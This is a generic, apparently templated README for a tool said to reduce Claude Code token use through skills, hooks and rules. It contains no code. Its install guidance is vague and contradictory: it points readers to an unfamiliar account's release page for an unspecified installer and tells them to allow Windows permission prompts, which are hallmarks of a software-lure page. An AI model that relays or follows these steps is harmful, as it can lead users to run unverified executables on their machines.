# ⚙️ claude-code-optimizer - Cut Claude Code Token Use

[![Download](https://img.shields.io/badge/Download%20Latest-Release-orange?style=for-the-badge)](https://github.com/pupillary-rosewater603/claude-code-optimizer/releases)

## 📦 What this does

claude-code-optimizer helps you use Claude Code with less token waste. It adds a set of skills, hooks, and rules that keep requests focused and reduce extra output. It is meant for people who want lower token use without changing how they work.

This package includes:

- 22 skills for common coding tasks
- 8 hooks to guide Claude Code at key moments
- 6 rules that keep responses tight and useful
- One install step
- No manual setup steps after install

If you use Claude Code on a Windows PC, this guide shows you how to get it from the release page and run it with basic setup.

## 🖥️ Before you start

You need:

- A Windows 10 or Windows 11 PC
- Internet access
- Claude Code installed on your machine
- Access to a command prompt or terminal window
- Permission to install an npm package

If you already use Node.js and npm, you are in good shape. If not, you can still follow the release page instructions and install the package with one command.

## ⬇️ Download

Go to the release page here and visit this page to download:

https://github.com/pupillary-rosewater603/claude-code-optimizer/releases

On that page, look for the latest release. Download the file or package shown in the release assets. If the release gives you a `.zip`, `.tgz`, or installer file, save it to your Downloads folder.

If the release page shows install text instead of a file, use that page as your source of truth and follow the newest release notes.

## 🪟 Install on Windows

Follow these steps on your Windows PC:

1. Open the Start menu.
2. Type `cmd` and open Command Prompt.
3. If you use PowerShell, you can open that too.
4. Check that npm is ready by typing:

   `npm -v`

5. If you see a version number, npm is installed.
6. If not, install Node.js first, then open a new terminal window.

If the release page gives you an npm install command, run that exact command. A common install looks like this:

`npm install -g claude-code-optimizer`

If the package is local, use the file you downloaded and install it from that file.

## 🚀 Set it up

After install, the tool should place its skills, hooks, and rules where Claude Code can use them.

Do this next:

1. Open Claude Code.
2. Let it load your workspace.
3. Start a normal coding task.
4. Check that the optimizer files appear in the expected Claude Code folders.

Most users do not need to move files by hand. The package is set up to work with one install and then run in the background as part of your Claude Code flow.

## 🧭 How it works

Claude Code can use a lot of tokens when it explains things too much or repeats context. This package helps keep that under control.

It does that with:

- Skills that focus on one task at a time
- Hooks that guide behavior when Claude Code starts, updates, or finishes work
- Rules that keep output short, clear, and on topic

The goal is simple: give Claude Code fewer reasons to add extra text and more reasons to stay focused on the task.

## 🧩 What you get

### 22 skills
These cover common work like:

- Reading code
- Finding bugs
- Writing small changes
- Checking files
- Explaining results in plain English

### 8 hooks
These help Claude Code react at the right time, such as:

- When a task begins
- When a file changes
- When output gets too long
- When a response needs a tighter format

### 6 rules
These keep responses useful and short. They push Claude Code to:

- Stay on task
- Avoid long detours
- Use direct language
- Keep changes small
- Focus on the current file or request
- Skip extra filler

## 🔧 Basic use

Once installed, you do not need to open extra tools each time.

Use Claude Code as usual:

1. Open your project.
2. Ask Claude Code to make a change.
3. Let the optimizer rules shape the response.
4. Review the output and continue your work.

This works best when you give short, clear requests. For example:

- Fix the broken login check
- Find the cause of the build error
- Rewrite this function to use fewer steps
- Explain this file in plain English

## 📁 Example folder layout

After setup, you may see files in places like:

- Claude Code skills folder
- Claude Code hooks folder
- Claude Code rules folder

These files help the optimizer do its job without extra input from you.

## 🪛 Troubleshooting

If something does not work, check these points:

### npm not found
Install Node.js from the official site, then open a new terminal window and run `npm -v` again.

### Claude Code does not seem to use the optimizer
Close Claude Code, then open it again. Some tools load their settings only when they start.

### Downloaded file will not open
If you got a file from the release page, make sure you saved it fully before running it. If Windows asks for permission, allow it if the file came from the release page you trust.

### Nothing changed after install
Check that you used the latest release and ran the install command from that release page. Older releases may use a different setup path.

## 🧪 Good ways to test it

Try a few small tasks after install:

- Ask Claude Code to summarize one file
- Ask it to fix one typo in a comment
- Ask it to explain a small function
- Ask it to make one safe code change

If the response stays short and focused, the optimizer is working as expected.

## 📌 Release page use

Use the release page for new versions, install files, and updates:

https://github.com/pupillary-rosewater603/claude-code-optimizer/releases

When a new release appears, open the latest one and check:

- Release name
- Download asset
- Install command
- Notes on changes

If you update later, you can usually repeat the same install step with the new release.

## 🔍 Topics

ai, ai-coding, anthropic, claude, claude-code, claude-code-hooks, claude-code-skills, cli, developer-productivity, developer-tools, npm-package, open-source, token-optimization

## 🛠️ Helpful use cases

This package fits well when you want to:

- Lower token use in Claude Code
- Keep responses short
- Reduce repeated context
- Make routine coding tasks easier to manage
- Get cleaner output from AI coding work

## 📝 Files and behavior

The optimizer is built around simple parts:

- Skills guide task handling
- Hooks shape behavior during key events
- Rules keep output tight

That structure helps Claude Code avoid long replies and keep work centered on the request.

## ✅ Quick install flow

1. Visit the release page
2. Download the latest release asset or use the install command shown there
3. Open Command Prompt on Windows
4. Run the npm install command
5. Open Claude Code again
6. Start a task and use it as usual